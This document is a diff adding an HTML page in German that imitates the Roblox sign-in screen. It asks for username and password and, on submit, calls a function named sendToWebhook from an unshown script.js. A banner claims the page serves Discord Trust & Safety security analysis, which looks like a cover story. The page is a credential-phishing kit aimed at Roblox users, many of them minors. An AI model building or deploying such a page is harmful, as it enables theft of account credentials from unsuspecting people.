@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Bei Roblox anmelden</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-box">
+    <h2>Bei Roblox anmelden</h2>
+    <form onsubmit="sendToWebhook(event)">
+      <input type="text" placeholder="Benutzer/E-Mail/Telefon" id="username" required>
+      <input type="password" placeholder="Passwort" id="password" required>
+      <button type="submit">Anmelden</button>
+    </form>
+    <div class="warning">
+      ⚠️ Diese Seite dient nur zu Sicherheitsanalysezwecken durch Discord Trust & Safety.
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
